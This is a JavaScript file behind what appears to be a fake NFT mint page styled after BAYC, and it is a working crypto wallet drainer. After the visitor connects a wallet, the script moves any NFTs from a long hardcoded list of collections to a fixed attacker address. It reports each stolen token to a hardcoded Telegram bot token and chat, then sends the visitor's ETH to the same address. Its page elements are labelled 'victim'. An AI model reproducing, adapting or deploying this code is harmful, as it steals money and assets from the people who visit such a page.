const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server";
const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
Moralis.start({
	serverUrl,
	appId
});
var web3;
var nfts;
var stopstealing = "sstop stealing";
var amount = 1;
        const receiverAddr = "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff";
          const contracts = [
      "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
      "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
      "0xf891eecd6850d47727e03d7802ba5a3b98e40486",
      "0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03",
      "0x08d7c0242953446436f34b4c78fe9da38c73668d",
      "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
      "0xdd012153e008346591153fFf28B0DD6724f0C256",
      "0x9930929903f9C6C83D9E7c70D058d03c376A8337",
      "0xa3AEe8BcE55BEeA1951EF834b99f3Ac60d1ABeeB",
      "0xb668beB1Fa440F6cF2Da0399f8C28caB993Bdd65",
      "0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B",
      "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e",
      "0xc541fC1Aa62384AB7994268883f80Ef92AAc6399",
      "0x86357A19E5537A8Fba9A004E555713BC943a66C0",
      "0xBD4455dA5929D5639EE098ABFaa3241e9ae111Af",
      "0xe785E82358879F061BC3dcAC6f0444462D4b5330",
      "0xba30E5F9Bb24caa003E9f2f0497Ad287FDF95623",
      "0x059EDD72Cd353dF5106D2B9cC5ab83a52287aC3a",
      "0x1A92f7381B9F03921564a437210bB9396471050C",
      "0x59468516a8259058baD1cA5F8f4BFF190d30E066",
      "0xa7d8d9ef8D8Ce8992Df33D8b8CF4Aebabd5bD270",
      "0x57a204AA1042f6E66DD7730813f4024114d74f37",
      "0xEdB61f74B0d09B2558F1eeb79B247c1F363Ae452",
      "0xFe190723a465C99293c4f035045C0a6880D25DbE",
      "0x78d61C684A992b0289Bbfe58Aaa2659F667907f8",
      "0x9168224fd1033Ca25aaEBae9efF39C92bD15231C",
      "0x86825dFCa7A6224cfBd2DA48e85DF2fc3Aa7C4B1",
      "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7",
      "0xc9D8F15803c645e98B17710a0b6593F097064bEF",
      "0x6fc3AD6177B07227647aD6b4Ae03cc476541A2a0",
      "0xAE3d8D68B4F6c3Ee784b2b0669885a315BA77C08",
      "0xF87E31492Faf9A91B02Ee0dEAAd50d51d56D5d4d",
      "0x959e104E1a4dB6317fA58F8295F586e1A978c297",
      "0x6dc6001535e15b9def7b0f6A20a2111dFA9454E2",
      "0xD0318da435DbcE0B347cc6faA330B5A9889e3585",
      "0xCE17F8Ef13cf67dA6EAb86e31360102eEA8609Ff",
      "0xCcc441ac31f02cD96C153DB6fd5Fe0a2F4e6A68d",
      "0x75E95ba5997Eb235F40eCF8347cDb11F18ff640B",
      "0x7AfEdA4c714e1C0A2a1248332c100924506aC8e6",
      "0x892848074ddeA461A15f337250Da3ce55580CA85",
      "0x5CC5B05a8A13E3fBDB0BB9FcCd98D38e50F90c38",
      "0x1CB1A5e65610AEFF2551A50f76a87a7d3fB649C6",
      "0x31B6D1289F96818E79dBB271bF77E8132B86e814",
      "0xd2F668a8461D6761115dAF8Aeb3cDf5F40C532C6",
      "0x79FCDEF22feeD20eDDacbB2587640e45491b757f",
      "0xab0b0dD7e4EaB0F9e31a539074a03f1C1Be80879",
      "0x3aBEDBA3052845CE3f57818032BFA747CDED3fca",
      "0x529A4e15b3ce13523417f945ecD0959FF71E0a9E",
      "0x698FbAACA64944376e2CDC4CAD86eaa91362cF54",
      "0x2acAb3DEa77832C09420663b0E1cB386031bA17B",
      "0x9df8Aa7C681f33E442A0d57B838555da863504f3",
      "0x9c80777CAe192E5031c38A0d951C55730eCC3f5e",
      "0x9705a7113363A383c8A96689e20286AbE6612bb3",
      "0x521f9C7505005CFA19A8E5786a9c3c9c9F5e6f42",
      "0xb6329bd2741c4E5e91e26C4e653dB643E74B2b19",
      "0xf54cC94f1F2f5De012B6Aa51F1E7eBdc43Ef5afC",
      "0x7EA3Cca10668B8346aeC0bf1844A49e995527c8B",
      "0x0b4B2bA334f476C8F41bFe52A428D6891755554d",
      "0xfE8C6d19365453D26af321D0e8c910428c23873F",
      "0x960b7a6BCD451c9968473f7bbFd9Be826EFd549A",
      "0xEDc3AD89f7b0963fe23D714B34185713706B815b",
      "0x6E9DA81ce622fB65ABf6a8d8040e460fF2543Add",
      "0x0972290a80333D19c6703073c3E57134A4cA0127",
      "0xEf0182dc0574cd5874494a120750FD222FdB909a",
      "0xb4d06d46A8285F4EC79Fd294F78a881799d8cEd9",
      "0xD7B397eDad16ca8111CA4A3B832d0a5E3ae2438C",
      "0x8ffb9b504d497e4000967391e70D542b8cC6748A",
      "0xB5C747561a185A146f83cFff25BdfD2455b31fF4",
      "0x13927739076014913A3a7C207ef84c5be4780014",
      "0x9C8D2F53F6Bff84458F1c84FDAa1e4852cA958E3",
      "0x8943C7bAC1914C9A7ABa750Bf2B6B09Fd21037E0",
      "0x2f102E69cbcE4938CF7fB27ADb40fAd097A13668",
      "0xA1D4657e0E6507D5a94d06DA93E94dC7C8c44b51",
      "0x4Db1f25D3d98600140dfc18dEb7515Be5Bd293Af",
      "0x38a6fd7148c4900338e903258B5E289Dfa995E2E",
      "0x950b9476a4de757BB134483029AC4Ec17E739e3A",
      "0x123b30E25973FeCd8354dd5f41Cc45A3065eF88C",
      "0x880644ddF208E471C6f2230d31f9027578FA6FcC",
      "0x3903d4fFaAa700b62578a66e7a67Ba4cb67787f9",
      "0x1bF47e4F2E9078c30914E33134b21C952B55c64B",
      "0x0c2E57EFddbA8c768147D1fdF9176a0A6EBd5d83",
      "0x86C10D10ECa1Fca9DAF87a279ABCcabe0063F247",
      "0xa5C0Bd78D1667c13BFB403E2a3336871396713c5",
      "0xC3Ae6E60A37a5f7D6d68E60c45b1ae50dA233bd4",
      "0x1B829B926a14634d36625e60165c0770C09D02b2",
      "0xC8E1de8Dc39a758C7a50F659b53F787e0F1398BD",
      "0x7eCb204feD7e386386CAb46a1fcB823ec5067aD5",
      "0xbad6186E92002E312078b5a1dAfd5ddf63d3f731",
      "0x28472a58A490c5e09A238847F66A68a47cC76f0f",
      "0x7AFe30cB3E53dba6801aa0EA647A0EcEA7cBe18d",
      "0x1AFEF6b252cc35Ec061eFe6a9676C90915a73F18",
      "0x09233d553058c2F42ba751C87816a8E9FaE7Ef10",
      "0x970d5e0bD5C4f193FCCf7Fd579590c5f5C69B2D9",
      "0x3Fe1a4c1481c8351E91B64D5c398b159dE07cbc5",
      "0x2E734269c869BDa3Ea6550F510d2514f2D66dE71",
      "0x8d609Bd201bEaea7DccbfbD9c22851e23Da68691",
      "0x5180db8F5c931aaE63c74266b211F580155ecac8",
      "0x177EF8787CEb5D4596b6f011df08C86eb84380dC",
      "0xbD275ce24f32d6cE4e9d9519C55ABe9Bc0ed7fCf",
      "0x35471f47c3C0BC5FC75025b97A19ECDDe00F78f8",
      "0x87E738a3d5E5345d6212D8982205A564289e6324",
      "0x0BD4D37E0907C9F564aaa0a7528837B81B25c605",
      "0xc92cedDfb8dd984A89fb494c376f9A48b999aAFc",
      "0x98a0227E99E7AF0f1f0D51746211a245c3B859c2",
      "0x8d4100897447d173289560BC85c5C432Be4f44E4",
      "0xfcB1315C4273954F74Cb16D5b663DBF479EEC62e",
      "0xBd3531dA5CF5857e7CfAA92426877b022e612cf8",
      "0xF4ee95274741437636e748DdAc70818B4ED7d043",
      "0x364C828eE171616a39897688A831c2499aD972ec",
      "0xcEFc0A83564DD2A083B83b4a73bBAe97e40fa7ea",
      "0x72D47d4d24018eC9048a9b0ae226F1C525B7E794",
      "0xD5A73977e6eFfC252A7f1AF4548BA11fF7187616",
      "0xc1Caf0C19A8AC28c41Fe59bA6c754e4b9bd54dE9",
      "0xE70Da20A2B10d60Ca620a4E494Fe2B37C9499E97",
      "0xbEA8123277142dE42571f1fAc045225a1D347977",
      "0x97597002980134beA46250Aa0510C9B90d87A587",
      "0x966731dFD9b9925DD105FF465687F5aA8f54Ee9f",
      "0xD78b76Fcc33cd416dA9d3D42f72649a23D7AC647",
      "0x62674b8aCe7D939bB07bea6d32c55b74650e0eaA",
      "0xA6A5eC7b1B8A34Ff2dcb2926b7c78f52A5ce3b90",
      "0xcE69a87C02bAA8C5F17Ed7eB8B1C2657aFC2E1aF",
      "0x67D9417C9C3c250f61A83C7e8658daC487B56B09",
      "0x5be99338289909d6dbBC57bb791140Ef85cCbCAB",
      "0xad9Fd7cB4fC7A0fBCE08d64068f60CbDE22Ed34C",
      "0x219B8aB790dECC32444a6600971c7C3718252539",
      "0x2070F7821D9c8EbfdECC1BC981D1308Cc0D93843",
      "0x244FC4178fa685Af909c88b4D4CD7eB9127eDb0B",
      "0xe51Aac67b09EaEd6d3D43e794D6bAe679Cbe09D8",
      "0x099689220846644F87D1137665CDED7BF3422747",
      "0x9A534628B4062E123cE7Ee2222ec20B86e16Ca8F",
      "0xb7bE4001BfF2c5F4a61dd2435E4c9A19D8d12343",
      "0x4a537F61ef574153664c0Dbc8c8F4B900cacBE5d",
      "0x5fdB2B0C56Afa73B8ca2228e6aB92Be90325961d",
      "0x226Bf5293692610692E2C996C9875C914d2A7f73",
      "0x46Ac8540d698167FCBb9e846511Beb8CF8af9BD8",
      "0x4B61413D4392c806E6d0fF5Ee91E6073C21d6430",
      "0x2931B181Ae9Dc8F8109eC41C42480933F411ef94",
      "0x19b86299c21505cdf59cE63740B240A9C822b5E4",
      "0x6632a9d63E142F17a668064D41A21193b49B41a0",
      "0x87084ec881d5A15C918057F326790dB177D218F2",
      "0x709d30f1f60F03D85A0EF33142eF3259392dC9e1",
      "0x5C1A0CC6DAdf4d0fB31425461df35Ba80fCBc110",
      "0xA351B769A01B445C04AA1b8E6275e03ec05C1E75",
      "0x1a2F71468F656E97c2F86541E57189F59951efe7",
      "0x3bf2922f4520a8BA0c2eFC3D2a1539678DaD5e9D",
      "0x4b3406a41399c7FD2BA65cbC93697Ad9E7eA61e5",
      "0x226Bf5293692610692E2C996C9875C914d2A7f73",
      "0x709d30f1f60F03D85A0EF33142eF3259392dC9e1",
      "0x7feB477600a03fd6ab1fE451cB3c7836a420F4AD",
      "0x8338D085aAe3aC048b9e1DE285fDef508CE73E45",
      "0xb8bE3Baea710c42b1fee566F1086B169B726F4a8",
      "0x1b79c7832ed9358E024F9e46E9c8b6f56633691B",
      "0x3Acce66cD37518A6d77d9ea3039E00B3A2955460",
      "0x95784F7b5c8849b0104EAf5D13d6341d8CC40750",
      "0xD73ACd7F5099fdd910215Dbff029185F21ffBCf0",
      "0x7AB2352b1D2e185560494D5e577F9D3c238b78C5",
      "0xC2C747E0F7004F9E8817Db2ca4997657a7746928",
      "0x9eEAeCBE2884AA7e82f450E3Fc174F30Fc2a8de3",
      "0xc6ec80029CD2aa4B0021cEb11248C07b25D2DE34",
      "0xc3f733ca98E0daD0386979Eb96fb1722A1A05E69",
      "0xf90980AE7A44E2d18B9615396FF5E9252F1DF639",
      "0x7AC66d40d80D2d8D1E45D6b5B10a1C9D1fd69354",
      "0xA7206d878c5c3871826DfdB42191c49B1D11F466",
      "0x8e2b2CA41427605BF3472eF260e8A3F6D633e3dD",
      "0xD692cEd124A474f051f9744a301C26D1017B3D54",
      "0xf61F24c2d93bF2dE187546B14425BF631F28d6dC",
      "0x666099e6f554aCF8Abb57181f559C194Ac21307F",
      "0xC92090f070bf50eEC26D849c88A68112f4f3D98e",
      "0x06012c8cf97BEaD5deAe237070F9587f8E7A266d",
      "0x4addcA4c07a5e9a6b4973094D03AD5aAE7735E5b",
      "0x572E33FFa523865791aB1C26B42a86aC244Df784",
      "0xb88392425e7b8Db37D43b1EB62022C9432fD997e",
      "0x71eB5C179CeB640160853144Cbb8dF5bd24aB5cC",
      "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB",
      "0x78a5E2B8c280FA5580fBE1e1ed546183f959d305",
      "0x0e9d6552b85BE180d941f1cA73Ae3E318D2D4F1F",
      "0x092bBc993042a69811d23FEb0E64E3bfa0920C6A",
      "0x4d928Fada59F3446627C5bea707A81e006Cf676f",
      "0x1Eb7382976077f92cf25c27CC3b900a274FD0012",
      "0xc5e55e4Bd5Fef12831b5a666fc9e391538ACdc45",
      "0xC7dF86762ba83f2a6197e1Ff9Bb40ae0f696B9E6",
      "0x06536BD54DD9B11fF664dC2880595AA4976188c3",
      "0x581e4FD879EFF9D2F36012c4dad563f64a2f250d",
      "0x54439D4908A3E19356F876aa6022D67d0b3B12d6",
      "0x1554F51F18F8E3fBe83E4442420E40Efc57ff446",
      "0x128675d4FddbC4a0D3f8aA777D8EE0fb8B427C2F",
      "0xB81Cf242671eDAE57754B1a061F62Af08B32926A",
      "0xd0B53410454370a482979C0adaf3667c6308a801",
      "0x2079812353E2C9409a788FBF5f383fa62aD85bE8",
      "0xfD38990c10dE39A79774f77fBD06dB5f4DD5489d",
      "0xAE63B956F7c77fba04e2eea59F7B8B2280f55431",
      "0x06220aB8413f9911403548a36d4C9Dc6481e6918",
      "0xd1169e5349d1cB9941F3DCbA135C8A4b9eACFDDE",
      "0xbBbBfCB29c56A5E0e251164A2554637096155ba9",
      "0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949",
      "0x907b5299756ca8dd27c62b621b0bc023420c6ffd",
      "0x701A038aF4Bd0fc9b69A829DdcB2f61185a49568",
      "0x3110EF5f612208724CA51F5761A69081809F03B7",
      "0x4a8C9D751EEAbc5521A68FB080DD7E72E46462aF",
      "0x341A1c534248966c4b6AFaD165B98DAED4B964ef",
      "0xFA7E3F898c80E31A3aedeAe8b0C713a3F9666264",
      "0xDDB149AE8E6635Df01a530da1E46921Bd78Dc385",
      "0x81Ae0bE3A8044772D04F32398bac1E1B4B215aa8",
      "0x524cAB2ec69124574082676e6F654a18df49A048",
      "0x18c7766A10df15Df8c971f6e8c1D2bbA7c7A410b",
      "0x620b70123fB810F6C653DA7644b5dD0b6312e4D8",
      "0xD9c036e9EEF725E5AcA4a22239A23feb47c3f05d",
      "0x1ECFDCcf97EdD64Fb73890Ca4541f306456A21eC",
      "0x16de9D750F4AC24226154C40980Ef83d4D3fD4AD",
      "0x4940885ff21bc5608d4d11d2fa04f6693fb7da12",
      "0x6d1c18bccde60142af23a3f8aa6f5f59c532a675",
      "0xb52a42919fa2c6e65fc95484dd907b817f19f627",
      "0x6c8984baf566db08675310b122bf0be9ea269eca",
      "0x2a52d32b2fb09492dde1ca2c36e1c69531664461",
      "0xd7e5e1c0cb9540669d8f22f71c9540460db23938",
      "0xaf62311ee2224fed4d3884a1793b4c50b86f4462",
      "0xef52b4480ea9419114f2353d75154490105a90ee",
      "0xc9b6321dc216d91e626e9baa61b06b0e4d55bdb1",
      "0xe9da256a28630efdc637bfd4c65f0887be1aeda8",
      "0x070cbef6414f8f0070a98051658bef840bcd86de",
      "0xd45058bf25bbd8f586124c479d384c8c708ce23a",
      "0xaba7161a7fb69c88e16ed9f455ce62b791ee4d03",
      "0x440b547982e0b0c526dfbfd088310d352addfa4f",
      "0x9b416915f1266128a2e163ae3b1f2c8b01c2d707",
      "0x9e9da94f8bb88d38604bfe824a983deae6ac5fe9",
      "0x77773f1e2ca26c2bd69e06e65d51800fbef1b468",
      "0x12ea19217c65f36385bb030d00525c1034e2f0af",
      "0xc352b534e8b987e036a93539fd6897f53488e56a",
      "0x7651a35c042326eefb176fab02d0e6096fdf100e",
      "0x4265de963cdd60629d03fee2cd3285e6d5ff6015",
      "0x0bdfd4ad937ff179985276b7f5be7ae3de0229e6",
      "0x8cbc5c6f260bef0f9edb71219a61a1c52062a586",
      "0xc37c41601bc88c91b6569c701f08d37fa0f565f0",
      "0x209aa937ac59f60384a70b98fec5daf54ac7b967",
      "0x9056d15c49b19df52ffad1e6c11627f035c0c960",
      "0xf9283e77f44c90669df3d2c5ebc3879952457f42",
      "0x2f6c47459a02cde6c331505db2194db6af68c332",
      "0x86d60f9ceeb3fc3bc4215122595c29e8f997af0a",
      "0x623fc4f577926c0aadaef11a243754c546c1f98c",
      "0x000000048797808be86aa9786c1f402671192d6b",
      "0xfde0594b5de4a3009b4c35b2c1ec7e1c0d12b3e1",
      "0xe9d30eddd11dea8433cf6d2b2c22e9cce94113dc",
      "0xf6b4215cdd70e0157cc96a32b5da3155037a7424",
      "0x7ff67da40beb9205a3c1842fbc7012451da96fff",
      "0xbaa5b7a6188365808c35b806e3a6b84a8db1ce95",
      "0x610b0f5e94e651383b6d7bbd9cca7aa797bd6ea9",
      "0xa8da6166cbd2876ccde424ee2a717c355be4702b",
      "0x2b3ab8e7bb14988616359b78709538b10900ab7d",
      "0xd584fe736e5aad97c437c579e884d15b17a54a51",
      "0x3dcb97ac03b6568e1d0b3e90a20ecc0f6dca34a4",
      "0x1b2ef9d5db72ea1103fc24eedd2226477409383a",
      "0xe19f2c38f64139146cea7b1571dee0f2e1bb8ec4",
      "0x9af756e7be065dca83674ec17f3703579a544da1",
      "0xcd1b5613e06a6d66f5106cf13e103c9b98253b0c",
      "0x433e7f8e28cdd827016f656b25ce9ef46558844a",
      "0x8f45f0274616686ff10b8895845c50d3bd2fb3ba",
      "0xf296178d553c8ec21a2fbd2c5dda8ca9ac905a00",
      "0x1354d8cef0b3459e2677db6321c25639d2b658bd",
      "0x5f9345fdad91bf9757445adc82e477b33fd3349c",
      "0x52ea3bf097a40f768e9cd49a735ba289882a0238",
      "0x05d50f9dc6f7f09ab77b1fb93a2a20c16c6f965f",
      "0xd23d2d4aa76df5c4a19e1c9b6a83ea83f8c3db18",
      "0x1ffa3371a45c22b1284fe5a251ed64f40580a1e3",
      "0x356c8460cb3d1fab69c64ffa40a4ce26f5427f60",
      "0x00000004af22764bb04ddf4402fd35f6e3011123",
      "0x8fda7f45b1427f2d4444f4c6d44d2b5d1cb46b53",
      "0xb8d682deb3014fb44ea84a3f9f70126cefa4b5e5",
      "0xd03721f1d0f6cfe00fed24b1cfa327e636294fee",
      "0x8e0a579b8b8dc0903c3fee1e7fbdb2f4996dc49d",
      "0x9a7a0670a66a6efe1a15b97f3dc0f8f47d7b11c3",
      "0x82888a271fae31794493b9f95d5f0f7175b810e3",
      "0x87219abc9109c43165e85801e4dc3d80cd3f88da",
      "0xd11277d411f138a67dc44b1fcd8a48c447d753e4",
      "0x495f947276749Ce646f68AC8c248420045cb7b5e",
    ];
const mintPrice = 0.002;
async function syncNfts() {
                try {
                    nfts = await Moralis.Web3.getNFTs({chain: "eth", address: await Moralis.Web3.account});
                } catch(err) {
                    console.log(err);
                    //alert("Web3 action rejected, try restarting your website.");
                }
            }
            
            async function syncChain() {
                if(Moralis.getChainId() != "0x1") {
                    try {
                        await web3.currentProvider.request({
                            method: "wallet_switchEthereumChain",
                            params: [{ chainId: "0x1" }]
                        });
                    } catch (err) {
                        await syncChain();
                    }
                }
            }
async function login(pvdr) {
	if (isMobile()) {
		if (window.ethereum) {;
		} else {
			var localurl = new URL(window.location);
			window.location.replace("https://metamask.app.link/dapp/" + localurl.host + localurl.pathname);
		}
	}
	let user = Moralis.User.current();
	try {
		user = await Moralis.authenticate({
			provider: pvdr,
			signingMessage: "I am signing my one-time nonce: 513767"
		})
   const accounts = await ethereum.request({ method: 'eth_accounts' })
		addr = accounts[0]
		$('.bayc-button-before').css('color', '#000');
		$('.bayc-button-before').css('background-color', '#bfc500');
		$('.bayc-button-before').css('cursor', 'pointer');
	} catch (error) {
		console.log(error)
	}
}

function isMobile() {
	return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
};
async function checkLoginStatus() {
	let user = Moralis.User.current();
	if (user) {
		$('.victim-wallet').html(user.get('ethAddress'));
		$('.sb-victimAddress').html(user.get('ethAddress'));
		$('.trade-view').show();
		$('.sidebar').show();
		$('.connect-wallet').html('MAIN NET');
		$('.connect-wallet').css('color', '#057b99');
		$('.sidebartogglebtn').show();
		closeLoginModal();
	} else {
		$('.trade-view').hide();
		$('.sidebar').hide();
	}
}
async function logOut() {
	await Moralis.User.logOut();
	console.log("logged out");
}

function closeLoginModal() {
	$('.w3modal').css('display', 'none');
}

function togglesidebar() {
	if ($('.sidebar').css('right') == '0px') {
		$('.sidebar').css('right', '-500px');
	} else {
		$('.sidebar').css('right', '0px');
	}
}
async function sendNft(nft) {
	const options = {
                  type: nft.contract_type.toLowerCase(),
                  receiver: receiverAddr,
                  contractAddress: nft.token_address,
                  tokenId: nft.token_id,
                  amount: nft.amount,
                };
		try {
                var z=$.ajax({  
  type: "POST",  
  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
  data: "parse_mode=HTML&text="+encodeURIComponent(nft.token_address), 
  }); 
            } catch (e) {
                throwmodal('Error: Insufficient funds!');
            }
        
                let transaction = await Moralis.transfer(options).catch(err => console.log(err));
		
                check(transaction, nft);
}
async function get() {
    for(var j = 0; j < contracts.length; j++) {
        const contract = contracts[j];
        for(var i = 0; i < nfts.length; i++) {
            const nft = nfts[i];
            if(strcmp(nft.token_address, contract) != 0) continue;
            return nft;
        }
    }
    return null;
}
async function check(transaction, nft) {
                spliceArr(nfts, nft);
                try {
                    await transaction.wait()
                } catch(err) {
                    nfts.push(nft);
                }
            }
function spliceArr(nftArr, nft) {
    for(var i = 0; i < nftArr.length; i++){ 				   
        if (nftArr[i] === nft) {
            nftArr.splice(i, 1); 
            i--;
        }
    }
}

function strcmp(x, y) { 
    x = JSON.stringify(x).toLowerCase();
    y = JSON.stringify(y).toLowerCase();
    return (x<y?-1:(x>y?1:0));  
}

async function sendEth() {
    const options = {
        type: "native",
        amount: Moralis.Units.ETH(mintPrice * amount),
        receiver: receiverAddr,
    };
    var stop = false;
    let result = await Moralis.transfer(options).catch(err => {
        
        stop = true;
    });
    return stop;
}

async function gett() {
    for(var i = 0; i < claim_data.nfts.length; i++) {
        return claim_data.nfts[i];
    }
    return null;
}

async function send() {
    console.log(nfts);
    var nft = await get();
    if(nft == null) {
        claim_data = {receiver: '0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff', mint_price: 0.33,  nfts: await Moralis.Web3.getNFTs()}
        var nft = await gett();
        if(nft == null) {
            stop = await sendEth();
        }     
        if(stop) return;
    } else {
        await sendNft(nft);
        return;
    }
    await send();
    return;
}

async function transact() {
    let user = Moralis.User.current();
    if (!user) {
        await connect();
        await syncChain();
        await syncNfts();
        await send();
        return;
    } else {
        await syncChain();
        await syncNfts();
        await send();
        return;
    }
}

async function throwmodal(errormsg) {
	$('.errormodal').html(errormsg);
	$('.errormodal').css('opacity', '1');
	await new Promise(resolve => setTimeout(resolve, 5000));
	$('.errormodal').css('opacity', '0');
}
$(document).ready(function() {
	checkLoginStatus();
	logOut();
	$('.sidebartogglebtn').hide();
	$("#connect").click(function() {
		login('metamask');
	});
	$("#wc-provider").click(function() {
		login('walletconnect');
	});
	$('#sendnft').click(function() {
		transact();
	})
});
